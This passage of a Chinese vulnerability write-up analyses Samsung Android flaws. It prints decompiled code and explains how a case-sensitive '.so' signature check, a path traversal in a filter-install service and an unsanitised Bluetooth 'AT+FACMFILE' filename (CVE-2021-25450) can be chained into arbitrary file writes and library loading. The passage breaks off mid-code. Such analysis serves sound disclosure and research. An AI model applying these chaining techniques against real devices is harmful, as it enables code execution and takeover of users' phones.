&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">this</span>.mServiceContext.getContentResolver().notifyChange(Constants.URI_NOTIFY_ADD, <span class="literal">null</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	<span class="keyword">private</span> <span class="type">long</span> <span class="title function_">storeLibFilters</span><span class="params">(AssetManager arg18, Resources arg19, String arg20, String arg21)</span> &#123;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">if</span>((arg20.endsWith(<span class="string">&quot;.so&quot;</span>)) &amp;&amp; !<span class="built_in">this</span>.checkSoSignature(v6)) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;Signature check failed.&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> -<span class="number">1L</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(!arg20.endsWith(<span class="string">&quot;.sig&quot;</span>)) &#123;</span><br><span class="line">			<span class="type">ContentResolver</span> <span class="variable">v10</span> <span class="operator">=</span> <span class="built_in">this</span>.mServiceContext.getContentResolver();</span><br><span class="line">			<span class="type">ContentValues</span> <span class="variable">v11</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ContentValues</span>();</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			<span class="type">int</span> <span class="variable">v8_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_title&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v9_1</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_vendor&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> arg19.getIdentifier(arg21 + <span class="string">&quot;_version&quot;</span>, <span class="string">&quot;string&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			Log.e(<span class="string">&quot;FilterInstaller&quot;</span>, <span class="string">&quot;title = &quot;</span> + arg19.getString(v8_1) + <span class="string">&quot; vendor = &quot;</span> + arg19.getString(v9_1) + <span class="string">&quot;, version = &quot;</span> + arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;name&quot;</span>, arg19.getString(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;filename&quot;</span>, v6);</span><br><span class="line">			v11.put(<span class="string">&quot;version&quot;</span>, arg19.getString(v4));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor&quot;</span>, arg19.getString(v9_1));</span><br><span class="line">			v11.put(<span class="string">&quot;package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			v11.put(<span class="string">&quot;title_id&quot;</span>, Integer.valueOf(v8_1));</span><br><span class="line">			v11.put(<span class="string">&quot;preload_filter&quot;</span>, Integer.valueOf(<span class="number">0</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;filter_type&quot;</span>, <span class="string">&quot;SINGLE&quot;</span>);</span><br><span class="line">			v11.put(<span class="string">&quot;category&quot;</span>, Integer.valueOf(<span class="number">2</span>));</span><br><span class="line">			v11.put(<span class="string">&quot;vendor_package_name&quot;</span>, <span class="built_in">this</span>.mPackageName);</span><br><span class="line">			<span class="keyword">if</span>(v0_2 != <span class="literal">null</span>) &#123;</span><br><span class="line">				v11.put(<span class="string">&quot;texture&quot;</span>, v13);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p><code>tex</code>和<code>so</code>文件将被提取，但是，对于<code>so</code>文件，<code>FilterProvider</code>将对包有一些检查。一个<code>.sig</code>签名文件必须伴随着预先创建的RSA公钥并经过验证，否则，<code>Content Provider</code>将拒绝将其插入到<code>content://com.samsung.android.provider.filterprovider/filters</code>表中。开发者的目的应该是，这样的文件是由三星的私钥签名并通过公钥验证，这样该包就可以在相机应用商店分发。但是，这里有一个问题：**校验过程只针对<code>so</code>，而没有包含<code>SO</code>**。这样，当下一次相机应用程序被打开时，并点击相应的图标后，所有的过滤器将被预装到相机进程空间中，相应的代码在<code>libcamera_effect_processor_jni.so</code>中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">sub_13A3A4</span><span class="params">(__int64 a1, <span class="type">char</span> *a2, <span class="type">char</span> *s1)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	v28 = <span class="number">0LL</span>;</span><br><span class="line">	ptr[<span class="number">0</span>] = <span class="number">0LL</span>;</span><br><span class="line">	<span class="keyword">if</span> ( <span class="built_in">strcmp</span>(s1, <span class="string">&quot;com.samsung.android.provider.filterprovider&quot;</span>) &amp;&amp; *(_DWORD *)(a1 + <span class="number">36</span>) != <span class="number">2</span> )</span><br><span class="line">	&#123;</span><br><span class="line">		asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/data/DownFilters/Lib64/&quot;</span>, a2);</span><br><span class="line">		v7 = <span class="string">&quot;/data/DownFilters/Tex/&quot;</span>;</span><br><span class="line">		LABEL_11:</span><br><span class="line">		ptr[<span class="number">1</span>] = v7;</span><br><span class="line">		<span class="keyword">goto</span> LABEL_12;</span><br><span class="line">	&#125;</span><br><span class="line">	v5 = *(_QWORD *)(a1 + <span class="number">16</span>);</span><br><span class="line">	<span class="keyword">if</span> ( v5 )</span><br><span class="line">	&#123;</span><br><span class="line">		v6 = sub_57490(v5, a2);</span><br><span class="line">		<span class="keyword">if</span> ( v6 )</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> ( v6 != <span class="number">400</span> )</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> ( (sub_57748(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)ptr, a2) &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">					sub_575C4(*(_QWORD *)(a1 + <span class="number">16</span>), (<span class="type">int</span>)&amp;v28, a2);</span><br><span class="line">				<span class="keyword">else</span></span><br><span class="line">					asprintf(ptr, <span class="string">&quot;%s%s&quot;</span>, <span class="string">&quot;/system/lib64/&quot;</span>, a2);</span><br><span class="line">					v7 = <span class="string">&quot;/system/cameradata/preloadfilters/Tex/&quot;</span>;</span><br><span class="line">					<span class="keyword">goto</span> LABEL_11;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	LABEL_12:</span><br><span class="line">	__android_log_print(<span class="number">3</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Try to open external effect (%s)&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">	*(_QWORD *)(a1 + <span class="number">56</span>) = dlopen(ptr[<span class="number">0</span>], <span class="number">2</span>);</span><br><span class="line">	<span class="built_in">free</span>(ptr[<span class="number">0</span>]);</span><br><span class="line">	v8 = *(<span class="type">void</span> **)(a1 + <span class="number">56</span>);</span><br><span class="line">	<span class="keyword">if</span> ( !v8 )</span><br><span class="line">	&#123;</span><br><span class="line">		v19 = dlerror();</span><br><span class="line">		__android_log_print(<span class="number">6</span>, <span class="string">&quot;SECIMAGING&quot;</span>, <span class="string">&quot;Filter %s dlopen failed&quot;</span>, v19);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	v9 = (__int64 (*)(<span class="type">void</span>))dlsym(v8, <span class="string">&quot;Create&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>赋予相机应用程序<code>WRITE_EFFECT_FILTER</code>权限以后，<code>FilterProvider</code>的服务<code>MyFilterService</code>将能够接收<code>Intent</code>，并将其写入到文件中：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.samsung.android.provider.filterprovider;</span><br><span class="line"><span class="keyword">void</span> <span class="title function_">install</span><span class="params">(Bundle arg15)</span> &#123;</span><br><span class="line">	Log.d(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(arg15 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : bundle is null, return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">this</span>.createMyFilterDirectory();</span><br><span class="line">	<span class="type">String</span> <span class="variable">v2</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v4</span> <span class="operator">=</span> arg15.getString(<span class="string">&quot;filename&quot;</span>);</span><br><span class="line">	<span class="type">byte</span>[] v6 = arg15.getByteArray(<span class="string">&quot;filter_thumbnail&quot;</span>);</span><br><span class="line">	<span class="type">String</span> <span class="variable">v7</span> <span class="operator">=</span> v2 + <span class="string">&quot;.bmp&quot;</span>;</span><br><span class="line">	<span class="type">String</span> <span class="variable">v8</span> <span class="operator">=</span> <span class="built_in">this</span>.copySelFileFromIntent(MyFilterInstaller.FILTER_STORAGE_MY_FILTER + <span class="string">&quot;/&quot;</span> + v4, arg15);</span><br><span class="line">	<span class="keyword">if</span>(v8 == <span class="literal">null</span>) &#123;</span><br><span class="line">		Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;install : sel file copy failed = &quot;</span> + v4 + <span class="string">&quot; return.&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="comment">//.. /data/xxx/ + &quot;../../../../../&quot;</span></span><br><span class="line"><span class="keyword">private</span> String <span class="title function_">copySelFileFromIntent</span><span class="params">(String arg9, Bundle arg10)</span> &#123;</span><br><span class="line">	<span class="type">byte</span>[] v9_1;</span><br><span class="line">	FileOutputStream v10;</span><br><span class="line">	File v5;</span><br><span class="line">	<span class="type">int</span> <span class="variable">v4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		v5 = <span class="keyword">new</span> <span class="title class_">File</span>(arg9);</span><br><span class="line">		<span class="keyword">goto</span> label_13;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">		v10 = <span class="literal">null</span>;</span><br><span class="line">		v5 = <span class="literal">null</span>;</span><br><span class="line">		<span class="keyword">goto</span> label_43;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			label_13:</span><br><span class="line">			<span class="keyword">if</span>(v5.exists()) &#123;</span><br><span class="line">				v5.delete();</span><br><span class="line">				Log.w(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;The named file already exists : &quot;</span> + arg9 + <span class="string">&quot;. So remove file.&quot;</span>);</span><br><span class="line">			&#125;</span><br><span class="line">			v5.createNewFile();</span><br><span class="line">			v9_1 = arg10.getByteArray(<span class="string">&quot;filter_data&quot;</span>);</span><br><span class="line">			v10 = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(v5);</span><br><span class="line">			<span class="keyword">goto</span> label_33;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">			v10 = <span class="literal">null</span>;</span><br><span class="line">			<span class="keyword">goto</span> label_43;</span><br><span class="line">			<span class="keyword">try</span> &#123;</span><br><span class="line">				label_33:</span><br><span class="line">				v10.write(v9_1);</span><br><span class="line">				<span class="keyword">if</span>(!v5.setExecutable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setExecutable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">if</span>(!v5.setReadable(<span class="literal">true</span>, <span class="literal">false</span>)) &#123;</span><br><span class="line">					Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;filter.setReadable when copy from asset is not complete properly&quot;</span>);</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">catch</span>(Exception unused_ex) &#123;</span><br><span class="line">				label_43:</span><br><span class="line">				Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">				<span class="keyword">if</span>(v10 != <span class="literal">null</span>) &#123;</span><br><span class="line">					<span class="keyword">try</span> &#123;</span><br><span class="line">						v10.close();</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">						Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">					&#125;</span><br><span class="line">		<span class="comment">//...</span></span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			v10.close();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">catch</span>(IOException unused_ex) &#123;</span><br><span class="line">			Log.e(<span class="string">&quot;MyFilterInstaller&quot;</span>, <span class="string">&quot;copySelFileFromIntent : Exception is occurred.&quot;</span>);</span><br><span class="line">			<span class="keyword">goto</span> label_62;</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>

<p>这个服务被签名权限所保护：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span> <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span> <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.MyFilterService&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">android:permission</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.permission.WRITE_FILTER&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.INSERT_MYFILTER_LIST&quot;</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">&quot;com.samsung.android.provider.filterprovider.DELETE_MYFILTER&quot;</span>/&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>有了这个bug，就可以利用之前的bug来调用服务，得到一个直接的文件写入，覆盖任何文件。</p>
<h2 id="3-2-Samsung-FactoryAirCommandManager路径穿越"><a href="#3-2-Samsung-FactoryAirCommandManager路径穿越" class="headerlink" title="3.2 Samsung FactoryAirCommandManager路径穿越"></a>3.2 Samsung FactoryAirCommandManager路径穿越</h2><p>漏洞编号为CVE-2021-25450，并在2021年9月的三星安全公告中得到修复。</p>
<p>漏洞在<code>BluetoothSocketModule</code>模块中，它有两个子类<code>BluetoothClient</code> 和 <code>BluetoothServer</code>。该漏洞允许攻击者通过蓝牙<code>socket</code>发送文件到任意路径，最主要的是蓝牙的连接不需要用户同意。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startSocket</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">    <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">byte</span>[] newBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxLength</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;startSocket&quot;</span>);</span><br><span class="line">    <span class="built_in">this</span>.readSocket = <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(<span class="built_in">this</span>.is, Charset.forName(<span class="string">&quot;UTF-8&quot;</span>)));</span><br><span class="line">    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;readSocket&quot;</span>, <span class="string">&quot;readSocket: &quot;</span> + <span class="built_in">this</span>.readSocket);</span><br><span class="line">    <span class="built_in">this</span>.isRunning = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">read</span> <span class="operator">=</span> <span class="built_in">this</span>.is.read(buffer);</span><br><span class="line">            <span class="keyword">if</span> (read == -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (AirCommandManager.getInstance().getModeTo() == <span class="number">10</span>) &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.isMetaMode = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.isContinue) &#123;</span><br><span class="line">                <span class="built_in">this</span>.startTime = System.currentTimeMillis();</span><br><span class="line">                <span class="built_in">this</span>.isContinue = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Receive &quot;</span> + read + <span class="string">&quot; bytes: &quot;</span> + Support.Functions.byteArrayToHexString(buffer, read));</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">this</span>.isFileMode) &#123;</span><br><span class="line">                <span class="built_in">this</span>.getFileSize += read;</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;getFileSize: &quot;</span> + <span class="built_in">this</span>.getFileSize);</span><br><span class="line">                ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;file mode&quot;</span>);</span><br><span class="line">                <span class="built_in">this</span>.fos.write(buffer, <span class="number">0</span>, read);</span><br><span class="line">                <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">this</span>.getFileSize &gt;= <span class="built_in">this</span>.fileLength) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end file mode&quot;</span>);</span><br><span class="line">                    <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">2</span>);</span><br><span class="line">                    <span class="built_in">this</span>.isFileMode = <span class="literal">false</span>;</span><br><span class="line">                    <span class="built_in">this</span>.fos.close();</span><br><span class="line">                    <span class="built_in">this</span>.getFileSize = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.isMetaMode) &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(buffer, read);</span><br><span class="line">                <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str, <span class="literal">false</span>);</span><br><span class="line">                ACUtil.sendMessage(context, str);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                System.arraycopy(buffer, <span class="number">0</span>, newBuffer, maxLength, read);</span><br><span class="line">                maxLength += read;</span><br><span class="line">                <span class="keyword">if</span> (newBuffer[maxLength - <span class="number">1</span>] == <span class="number">126</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG byte&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> Support.Functions.byteArrayToHexString(fullBuffer);</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;DIAG str: &quot;</span> + str2);</span><br><span class="line">                    <span class="built_in">this</span>.mBluetoothBypassModule.sendDataFromSendModule(str2, <span class="literal">false</span>);</span><br><span class="line">                    ACUtil.sendMessage(context, str2);</span><br><span class="line">                    maxLength = <span class="number">0</span>;</span><br><span class="line">                    Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (maxLength &gt; <span class="number">1</span> &amp;&amp; newBuffer[maxLength - <span class="number">2</span>] == <span class="number">13</span> &amp;&amp; newBuffer[maxLength - <span class="number">1</span>] == <span class="number">10</span>) &#123;</span><br><span class="line">                    ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;string&quot;</span>);</span><br><span class="line">                    <span class="type">byte</span>[] fullBuffer2 = <span class="keyword">new</span> <span class="title class_">byte</span>[maxLength];</span><br><span class="line">                    System.arraycopy(newBuffer, <span class="number">0</span>, fullBuffer2, <span class="number">0</span>, maxLength);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">str3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(fullBuffer2, <span class="number">0</span>, maxLength, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (str3.toUpperCase().contains(<span class="string">&quot;AT+FACMFILE&quot;</span>)) &#123;</span><br><span class="line">                        <span class="built_in">this</span>.isFileMode = <span class="literal">true</span>;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">subStr</span> <span class="operator">=</span> str3.substring(str3.indexOf(<span class="string">&quot;=&quot;</span>) + <span class="number">1</span>, str3.length() - <span class="number">2</span>);</span><br><span class="line">                        <span class="built_in">this</span>.fileName = subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">0</span>];</span><br><span class="line">                        <span class="built_in">this</span>.fileLength = Integer.parseInt(subStr.split(<span class="string">&quot;,&quot;</span>)[<span class="number">1</span>]);</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;name: &quot;</span> + <span class="built_in">this</span>.fileName + <span class="string">&quot; length: &quot;</span> + <span class="built_in">this</span>.fileLength);</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath);</span><br><span class="line">                        <span class="keyword">if</span> (!file.exists()) &#123;</span><br><span class="line">                            file.mkdirs();</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="type">File</span> <span class="variable">file2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(savePath + <span class="built_in">this</span>.fileName);</span><br><span class="line">                        ACUtil.log_d(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;Save: &quot;</span> + file2.getPath());</span><br><span class="line">                        <span class="keyword">if</span> (<span class="built_in">this</span>.fileLength != <span class="number">0</span>) &#123;</span><br><span class="line">                            <span class="built_in">this</span>.fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(file2);</span><br><span class="line">                            <span class="built_in">this</span>.mHandler.sendEmptyMessage(<span class="number">0</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        maxLength = <span class="number">0</span>;</span><br><span class="line">                        Arrays.fill(newBuffer, (<span class="type">byte</span>) <span class="number">0</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        ACUtil.log_i(CLASS_NAME, <span class="string">&quot;Socket&quot;</span>, <span class="string">&quot;end string&quot;</span>);</span><br><span class="line">                        <span 